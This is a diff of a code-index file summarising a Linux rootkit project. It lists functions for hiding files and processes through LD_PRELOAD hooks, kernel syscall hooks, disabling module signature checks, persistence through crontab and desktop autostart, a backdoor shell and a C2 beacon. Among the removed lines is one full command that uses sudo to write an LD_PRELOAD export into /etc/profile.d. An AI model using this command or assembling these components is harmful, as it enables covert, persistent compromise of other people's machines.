@@ -6,62 +6,29 @@
 - Symbols:
   - `Command` (struct, line 43)
   - `VirtualFile` (struct, line 49)
-  - `get_ld_preload` (function, line 83) `char *get_ld_preload()`
+  - `get_ld_preload` (function, line 84) `char *get_ld_preload()`
   - `set_ld_preload` (function, line 87) `void set_ld_preload(const char *ld_preload)`
   - `ensure_ld_preload` (function, line 100) `void ensure_ld_preload()`
   - `ensure_pid_file_exists` (function, line 117) `void ensure_pid_file_exists()`
-  - `check_elevate` (function, line 135) `int check_elevate()`
-  - `write_file` (function, line 144) `void write_file(const char *path, const char *content, mode_t mode)`
-  - `crontab` (function, line 155) `void crontab(const char *path)`
-  - `generate_random_string` (function, line 167) `char *generate_random_string()`
-  - `xdg` (function, line 177) `void xdg(const char *path, int admin)`
-  - `kde_plasma` (function, line 199) `void kde_plasma(const char *path)`
-  - `copy_binary` (function, line 214) `void copy_binary(const char *source, const char *destination)`
-  - `persist` (function, line 233) `void persist(const char *path)`
-  - `ensure_key_file_exists` (function, line 250) `void ensure_key_file_exists()`
+  - `check_elevate` (function, line 136) `int check_elevate()`
+  - `write_file` (function, line 145) `void write_file(const char *path, const char *content, mode_t mode)`
+  - `crontab` (function, line 156) `void crontab(const char *path)`
+  - `generate_random_string` (function, line 168) `char *generate_random_string()`
+  - `xdg` (function, line 178) `void xdg(const char *path, int admin)`
+  - `kde_plasma` (function, line 200) `void kde_plasma(const char *path)`
+  - `copy_binary` (function, line 215) `void copy_binary(const char *source, const char *destination)`
+  - `persist` (function, line 234) `void persist(const char *path)`
+  - `ensure_key_file_exists` (function, line 253) `void ensure_key_file_exists()`
   - `ensure_hide_file_exists` (function, line 271) `void ensure_hide_file_exists()`
   - `infect_command` (function, line 289) `void infect_command()`
   - `load_rootkit` (function, line 303) `void load_rootkit()`
-  - `unload_rootkit` (function, line 313) `void unload_rootkit()`
+  - `unload_rootkit` (function, line 314) `void unload_rootkit()`
   - `handle_client` (function, line 321) `void *handle_client(void *client_socket)`
-  - `mon_shell` (function, line 520) `void *mon_shell(void *data)`
-  - `signal_handler` (function, line 608) `void signal_handler(int signum)`
-  - `reboot_system` (function, line 614) `void reboot_system()`
-  - `main` (function, line 638) `int main()`
-  - `getenv` (function, line 85) `return getenv("LD_PRELOAD");`
-  - `fprintf` (function, line 90) `fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);`
-  - `fclose` (function, line 91) `fclose(profile);`
-  - `printf` (function, line 103) `printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD);`
-  - `execl` (function, line 107) `execl("/bin/bash", "bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_preload.sh'", (char *)NULL);`
-  - `perror` (function, line 108) `perror("execl failed");`
-  - `exit` (function, line 109) `exit(EXIT_FAILURE);`
-  - `waitpid` (function, line 113) `waitpid(pid, NULL, 0);`
-  - `pclose` (function, line 130) `pclose(cmd);`
-  - `chmod` (function, line 153) `chmod(path, mode);`
-  - `snprintf` (function, line 159) `snprintf(command, sizeof(command), "@reboot %s\n", path);`
-  - `system` (function, line 163) `system(command);`
-  - `remove` (function, line 164) `remove(tmp_path);`
-  - `srand` (function, line 169) `srand(time(NULL));`
-  - `free` (function, line 197) `free(filename);`
-  - `fwrite` (function, line 226) `fwrite(buffer, 1, bytesRead, dest);`
-  - `mkdir` (function, line 247) `mkdir(dirname(new_path), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);`
-  - `dlclose` (function, line 316) `dlclose(rootkit_handle);`
-  - `send` (function, line 328) `send(sock, "Enter password: ", 16, 0);`
-  - `memset` (function, line 330) `memset(buffer, 0, BUFFER_SIZE);`
-  - `close` (function, line 332) `close(sock);`
-  - `pthread_exit` (function, line 333) `pthread_exit(NULL);`
-  - `execvp` (function, line 387) `execvp("bash", command_args);`
-  - `raise` (function, line 440) `raise(SIGTERM);`
-  - `unsetenv` (function, line 455) `unsetenv("LD_PRELOAD");`
-  - `time` (function, line 491) `time(&current_time);`
-  - `sleep` (function, line 527) `sleep(1);`
-  - `closedir` (function, line 558) `closedir(dir);`
-  - `setsid` (function, line 565) `setsid();`
-  - `setenv` (function, line 578) `setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);`
-  - `signal` (function, line 655) `signal(SIGTERM, signal_handler);`
-  - `pthread_detach` (function, line 703) `pthread_detach(client_thread);`
-  - `pthread_join` (function, line 707) `pthread_join(mon_thread, NULL);`
-  - `PORT` (macro, line 30) `#define PORT`
+  - `mon_shell` (function, line 521) `void *mon_shell(void *data)`
+  - `signal_handler` (function, line 609) `void signal_handler(int signum)`
+  - `reboot_system` (function, line 615) `void reboot_system()`
+  - `main` (function, line 639) `int main()`
+  - `PORT` (macro, line 31) `#define PORT`
   - `BUFFER_SIZE` (macro, line 32) `#define BUFFER_SIZE`
   - `MAX_COMMANDS` (macro, line 33) `#define MAX_COMMANDS`
   - `DESIRED_LD_PRELOAD` (macro, line 34) `#define DESIRED_LD_PRELOAD`
@@ -77,16 +44,16 @@
 - Symbols:
   - `linux_dirent64` (struct, line 548)
   - `original_dirent` (type_alias, line 51) `typedef struct dirent original_dirent;`
-  - `load_hidden_pids` (function, line 72) `void load_hidden_pids()`
-  - `load_hidden_files` (function, line 92) `void load_hidden_files()`
-  - `unlink` (function, line 112) `int unlink(const char *pathname)`
-  - `kill` (function, line 124) `int kill(pid_t pid, int sig)`
-  - `remove` (function, line 144) `int remove(const char *pathname)`
-  - `unlinkat` (function, line 156) `int unlinkat(int dirfd, const char *pathname, int flags)`
-  - `get_username_from_pid` (function, line 177) `char* get_username_from_pid(pid_t pid)`
-  - `should_hide_pid` (function, line 196) `int should_hide_pid(const char* pid)`
-  - `should_hide_file` (function, line 211) `int should_hide_file(const char* filename)`
-  - `readdir` (function, line 221) `struct dirent* readdir(DIR* dirp)`
+  - `load_hidden_pids` (function, line 73) `void load_hidden_pids()`
+  - `load_hidden_files` (function, line 93) `void load_hidden_files()`
+  - `unlink` (function, line 113) `int unlink(const char *pathname)`
+  - `kill` (function, line 125) `int kill(pid_t pid, int sig)`
+  - `remove` (function, line 145) `int remove(const char *pathname)`
+  - `unlinkat` (function, line 157) `int unlinkat(int dirfd, const char *pathname, int flags)`
+  - `get_username_from_pid` (function, line 178) `char* get_username_from_pid(pid_t pid)`
+  - `should_hide_pid` (function, line 197) `int should_hide_pid(const char* pid)`
+  - `should_hide_file` (function, line 212) `int should_hide_file(const char* filename)`
+  - `readdir` (function, line 222) `struct dirent* readdir(DIR* dirp)`
   - `fopen` (function, line 283) `FILE *fopen(const char *pathname, const char *mode)`
   - `my_open` (function, line 327) `int my_open(const char *pathname, int flags, mode_t mode)`
   - `my_openat` (function, line 371) `int my_openat(int dirfd, const char *pathname, int flags, mode_t mode)`
@@ -95,26 +62,8 @@
   - `fstat` (function, line 503) `int fstat(int fd, struct stat *statbuf)`
   - `getdents` (function, line 557) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `getdents64` (function, line 618) `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
-  - `main` (function, line 677) `int main()`
-  - `int` (function, line 54) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-  - `perror` (function, line 76) `perror("Error opening PID file");`
-  - `fclose` (function, line 89) `fclose(file);`
-  - `orig_unlink` (function, line 121) `return orig_unlink(pathname);`
-  - `orig_kill` (function, line 141) `return orig_kill(pid, sig);`
-  - `orig_remove` (function, line 153) `return orig_remove(pathname);`
-  - `orig_unlinkat` (function, line 175) `return orig_unlinkat(dirfd, pathname, flags);`
-  - `snprintf` (function, line 183) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-  - `fprintf` (function, line 226) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
-  - `orig_fopen` (function, line 322) `return orig_fopen(pathname, mode);`
-  - `orig_open` (function, line 366) `return orig_open(pathname, flags, mode);`
-  - `orig_openat` (function, line 410) `return orig_openat(dirfd, pathname, flags, mode);`
-  - `orig_stat` (function, line 454) `return orig_stat(pathname, statbuf);`
-  - `orig_lstat` (function, line 498) `return orig_lstat(pathname, statbuf);`
-  - `orig_fstat` (function, line 544) `return orig_fstat(fd, statbuf);`
-  - `memmove` (function, line 606) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-  - `printf` (function, line 693) `printf("PID: %ld, Username: %s\n", pid, username);`
-  - `closedir` (function, line 698) `closedir(proc);`
-  - `HIDDEN_DIR` (macro, line 32) `#define HIDDEN_DIR`
+  - `main` (function, line 678) `int main()`
+  - `HIDDEN_DIR` (macro, line 33) `#define HIDDEN_DIR`
   - `HIDDEN_FILE` (macro, line 34) `#define HIDDEN_FILE`
   - `HIDDEN_FILE1` (macro, line 35) `#define HIDDEN_FILE1`
   - `HIDDEN_FILE2` (macro, line 36) `#define HIDDEN_FILE2`
@@ -126,7 +75,7 @@
   - `HIDDEN_FILE8` (macro, line 42) `#define HIDDEN_FILE8`
   - `HIDDEN_FILE9` (macro, line 43) `#define HIDDEN_FILE9`
   - `PATHMRHYDE` (macro, line 44) `#define PATHMRHYDE`
-  - `HIDE_DIR` (macro, line 45) `#define HIDE_DIR`
+  - `HIDE_DIR` (macro, line 46) `#define HIDE_DIR`
   - `HIDE_USER` (macro, line 47) `#define HIDE_USER`
   - `MAX_HIDE_PIDS` (macro, line 48) `#define MAX_HIDE_PIDS`
   - `PID_FILE_PATH` (macro, line 49) `#define PID_FILE_PATH`
@@ -138,14 +87,14 @@
 - Symbols:
   - `linux_dirent64` (struct, line 461)
   - `original_dirent` (type_alias, line 48) `typedef struct dirent original_dirent;`
-  - `load_hidden_pids` (function, line 62) `void load_hidden_pids()`
-  - `unlink` (function, line 82) `int unlink(const char *pathname)`
-  - `kill` (function, line 94) `int kill(pid_t pid, int sig)`
-  - `remove` (function, line 114) `int remove(const char *pathname)`
-  - `unlinkat` (function, line 126) `int unlinkat(int dirfd, const char *pathname, int flags)`
-  - `get_username_from_pid` (function, line 147) `char* get_username_from_pid(pid_t pid)`
-  - `should_hide_pid` (function, line 166) `int should_hide_pid(const char* pid)`
-  - `readdir` (function, line 181) `struct dirent* readdir(DIR* dirp)`
+  - `load_hidden_pids` (function, line 63) `void load_hidden_pids()`
+  - `unlink` (function, line 83) `int unlink(const char *pathname)`
+  - `kill` (function, line 95) `int kill(pid_t pid, int sig)`
+  - `remove` (function, line 115) `int remove(const char *pathname)`
+  - `unlinkat` (function, line 127) `int unlinkat(int dirfd, const char *pathname, int flags)`
+  - `get_username_from_pid` (function, line 148) `char* get_username_from_pid(pid_t pid)`
+  - `should_hide_pid` (function, line 167) `int should_hide_pid(const char* pid)`
+  - `readdir` (function, line 182) `struct dirent* readdir(DIR* dirp)`
   - `fopen` (function, line 238) `FILE *fopen(const char *pathname, const char *mode)`
   - `my_open` (function, line 275) `int my_open(const char *pathname, int flags, mode_t mode)`
   - `my_openat` (function, line 312) `int my_openat(int dirfd, const char *pathname, int flags, mode_t mode)`
@@ -154,26 +103,8 @@
   - `fstat` (function, line 423) `int fstat(int fd, struct stat *statbuf)`
   - `getdents` (function, line 470) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `getdents64` (function, line 527) `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
-  - `main` (function, line 582) `int main()`
-  - `int` (function, line 51) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-  - `perror` (function, line 66) `perror("Error opening PID file");`
-  - `fclose` (function, line 79) `fclose(file);`
-  - `orig_unlink` (function, line 91) `return orig_unlink(pathname);`
-  - `orig_kill` (function, line 111) `return orig_kill(pid, sig);`
-  - `orig_remove` (function, line 123) `return orig_remove(pathname);`
-  - `orig_unlinkat` (function, line 145) `return orig_unlinkat(dirfd, pathname, flags);`
-  - `snprintf` (function, line 153) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-  - `fprintf` (function, line 186) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
-  - `orig_fopen` (function, line 270) `return orig_fopen(pathname, mode);`
-  - `orig_open` (function, line 307) `return orig_open(pathname, flags, mode);`
-  - `orig_openat` (function, line 344) `return orig_openat(dirfd, pathname, flags, mode);`
-  - `orig_stat` (function, line 381) `return orig_stat(pathname, statbuf);`
-  - `orig_lstat` (function, line 418) `return orig_lstat(pathname, statbuf);`
-  - `orig_fstat` (function, line 457) `return orig_fstat(fd, statbuf);`
-  - `memmove` (function, line 515) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-  - `printf` (function, line 598) `printf("PID: %ld, Username: %s\n", pid, username);`
-  - `closedir` (function, line 603) `closedir(proc);`
-  - `HIDDEN_DIR` (macro, line 30) `#define HIDDEN_DIR`
+  - `main` (function, line 583) `int main()`
+  - `HIDDEN_DIR` (macro, line 31) `#define HIDDEN_DIR`
   - `HIDDEN_FILE` (macro, line 32) `#define HIDDEN_FILE`
   - `HIDDEN_FILE1` (macro, line 33) `#define HIDDEN_FILE1`
   - `HIDDEN_FILE2` (macro, line 34) `#define HIDDEN_FILE2`
@@ -185,7 +116,7 @@
   - `HIDDEN_FILE8` (macro, line 40) `#define HIDDEN_FILE8`
   - `HIDDEN_FILE9` (macro, line 41) `#define HIDDEN_FILE9`
   - `PATHMRHYDE` (macro, line 42) `#define PATHMRHYDE`
-  - `HIDE_DIR` (macro, line 43) `#define HIDE_DIR`
+  - `HIDE_DIR` (macro, line 44) `#define HIDE_DIR`
   - `HIDE_USER` (macro, line 45) `#define HIDE_USER`
   - `MAX_HIDE_PIDS` (macro, line 46) `#define MAX_HIDE_PIDS`
   - `PID_FILE_PATH` (macro, line 47) `#define PID_FILE_PATH`
@@ -207,57 +138,29 @@
   - `uring_get_sqe` (function, line 130) `static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring)`
   - `uring_submit` (function, line 141) `static int uring_submit(struct io_uring *ring)`
   - `uring_wait_cqe_timeout` (function, line 149) `static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeo...`
-  - `uring_cqe_seen` (function, line 162) `static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)`
+  - `uring_cqe_seen` (function, line 163) `static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)`
   - `init_root_ring` (function, line 176) `static int init_root_ring(void)`
   - `uring_read_whole_file` (function, line 197) `static char *uring_read_whole_file(const char *path)`
   - `traditional_read_file` (function, line 253) `static char *traditional_read_file(const char *path)`
   - `load_hidden_pids` (function, line 268) `void load_hidden_pids(void)`
-  - `load_hidden_files` (function, line 281) `void load_hidden_files(void)`
+  - `load_hidden_files` (function, line 282) `void load_hidden_files(void)`
   - `get_username_from_pid` (function, line 297) `char* get_username_from_pid(pid_t pid)`
-  - `should_hide_pid` (function, line 319) `int should_hide_pid(const char* pid)`
+  - `should_hide_pid` (function, line 320) `int should_hide_pid(const char* pid)`
   - `should_hide_file` (function, line 329) `int should_hide_file(const char* filename)`
-  - `readdir` (function, line 335) `struct dirent* readdir(DIR* dirp)`
-  - `unlink` (function, line 366) `int unlink(const char *pathname)`
+  - `readdir` (function, line 336) `struct dirent* readdir(DIR* dirp)`
+  - `unlink` (function, line 367) `int unlink(const char *pathname)`
   - `kill` (function, line 373) `int kill(pid_t pid, int sig)`
   - `remove` (function, line 383) `int remove(const char *pathname)`
   - `unlinkat` (function, line 389) `int unlinkat(int dirfd, const char *pathname, int flags)`
   - `fopen` (function, line 407) `FILE *fopen(const char *pathname, const char *mode)`
-  - `open` (function, line 429) `int open(const char *pathname, int flags, ...)`
-  - `openat` (function, line 457) `int openat(int dirfd, const char *pathname, int flags, ...)`
+  - `open` (function, line 430) `int open(const char *pathname, int flags, ...)`
+  - `openat` (function, line 458) `int openat(int dirfd, const char *pathname, int flags, ...)`
   - `stat` (function, line 487) `int stat(const char *pathname, struct stat *statbuf)`
   - `lstat` (function, line 511) `int lstat(const char *pathname, struct stat *statbuf)`
   - `fstat` (function, line 535) `int fstat(int fd, struct stat *statbuf)`
   - `getdents` (function, line 569) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
-  - `getdents64` (function, line 604) `ssize_t getdents64(int fd, void *dirp, size_t count)`
-  - `syscall` (function, line 74) `return syscall(__NR_io_uring_setup, entries, p);`
-  - `memset` (function, line 87) `memset(&params, 0, sizeof(params));`
-  - `free` (function, line 191) `free(iov.iov_base);`
-  - `pthread_mutex_lock` (function, line 199) `pthread_mutex_lock(&ring_mutex);`
-  - `memcpy` (function, line 242) `memcpy(buf + total_read, block, bytes_read);`
-  - `close` (function, line 246) `close(fd);`
-  - `pthread_mutex_unlock` (function, line 248) `pthread_mutex_unlock(&ring_mutex);`
-  - `fseek` (function, line 256) `fseek(f, 0, SEEK_END);`
-  - `fclose` (function, line 263) `fclose(f);`
-  - `snprintf` (function, line 302) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-  - `int` (function, line 314) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-  - `orig_unlink` (function, line 371) `return orig_unlink(pathname);`
-  - `orig_kill` (function, line 381) `return orig_kill(pid, sig);`
-  - `orig_remove` (function, line 387) `return orig_remove(pathname);`
-  - `orig_unlinkat` (function, line 403) `return orig_unlinkat(dirfd, pathname, flags);`
-  - `orig_fopen` (function, line 427) `return orig_fopen(pathname, mode);`
-  - `va_start` (function, line 452) `va_start(args, flags);`
-  - `va_end` (function, line 454) `va_end(args);`
-  - `orig_open` (function, line 455) `return orig_open(pathname, flags, mode);`
-  - `orig_openat` (function, line 483) `return orig_openat(dirfd, pathname, flags, mode);`
-  - `orig_stat` (function, line 507) `return orig_stat(pathname, statbuf);`
-  - `orig_lstat` (function, line 531) `return orig_lstat(pathname, statbuf);`
-  - `orig_fstat` (function, line 557) `return orig_fstat(fd, statbuf);`
-  - `memmove` (function, line 596) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-  - `inet_pton` (function, line 657) `inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);`
-  - `sleep` (function, line 697) `sleep(60);`
-  - `pthread_create` (function, line 714) `pthread_create(&c2_thread, NULL, c2_beacon_thread, NULL);`
-  - `pthread_detach` (function, line 715) `pthread_detach(c2_thread);`
-  - `_GNU_SOURCE` (macro, line 6) `#define _GNU_SOURCE`
+  - `getdents64` (function, line 605) `ssize_t getdents64(int fd, void *dirp, size_t count)`
+  - `_GNU_SOURCE` (macro, line 7) `#define _GNU_SOURCE`
   - `HIDDEN_DIR` (macro, line 33) `#define HIDDEN_DIR`
   - `HIDDEN_FILE` (macro, line 34) `#define HIDDEN_FILE`
   - `HIDDEN_FILE1` (macro, line 35) `#define HIDDEN_FILE1`
@@ -289,7 +192,7 @@
 
 ## modules/rootkit/rootkit.c
 - Layer: utility
-- Doc: include <linux/init.h> include <linux/module.h> include <linux/kprobes.h> include <linux/dirent.h> include <linux/uacces
+- Doc: Define the process name and file name to hide
 - Language: c
 - Symbols:
   - `regs_override_return` (function, line 43) `static inline void regs_override_return(struct pt_regs *regs, long new_ret)`
@@ -299,19 +202,6 @@
   - `disable_module_signature_verification` (function, line 181) `static void disable_module_signature_verification(void)`
   - `hook_syscalls` (function, line 195) `static int __init hook_syscalls(void)`
   - `unhook_syscalls` (function, line 208) `static void __exit unhook_syscalls(void)`
-  - `long` (function, line 38) `asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);`
-  - `ssize_t` (function, line 40) `asmlinkage ssize_t (*original_read)(int fd, void __user *buf, size_t count);`
-  - `memmove` (function, line 89) `memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));`
-  - `printk` (function, line 146) `printk(KERN_INFO "Special string found: %s\n", buffer);`
-  - `sock_release` (function, line 161) `sock_release(sock);`
-  - `call_usermodehelper` (function, line 166) `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
-  - `strlen` (function, line 174) `return strlen(backdoor_message);`
-  - `original_read` (function, line 176) `return original_read(fd, buf, count);`
-  - `volatile` (function, line 185) `asm volatile("mov %%cr4, %0" : "=r" (cr4));`
-  - `register_kretprobe` (function, line 200) `register_kretprobe(&kretprobe_getdents);`
-  - `unregister_kretprobe` (function, line 210) `unregister_kretprobe(&kretprobe_getdents);`
-  - `module_init` (function, line 214) `module_init(hook_syscalls);`
-  - `MODULE_LICENSE` (function, line 217) `MODULE_LICENSE("GPL");`
   - `HIDDEN_PROCESS_NAME` (macro, line 26) `#define HIDDEN_PROCESS_NAME`
   - `HIDDEN_FILE_NAME` (macro, line 27) `#define HIDDEN_FILE_NAME`
   - `LISTENER_IP` (macro, line 28) `#define LISTENER_IP`
